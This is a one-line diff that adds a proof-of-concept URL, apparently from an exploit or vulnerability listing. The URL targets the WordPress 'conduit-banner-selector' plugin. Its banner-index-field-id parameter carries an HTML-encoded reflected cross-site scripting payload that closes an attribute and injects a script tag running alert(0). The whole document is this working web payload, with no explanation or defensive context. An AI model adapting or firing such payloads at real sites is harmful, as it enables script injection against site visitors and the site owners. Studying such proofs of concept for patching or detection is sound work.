@@ -1,0 +1,1 @@
+http://www.example.com/wordpress/wp-content/plugins/conduit-banner-selector/conduit-banner-selector-banners.php?category-field-id=&amp;category-id=120x240&amp;page=&amp;banner-index-field-id=&#039;)&quot;/&gt;&lt;script&gt;alert(0)&lt;/script&gt;
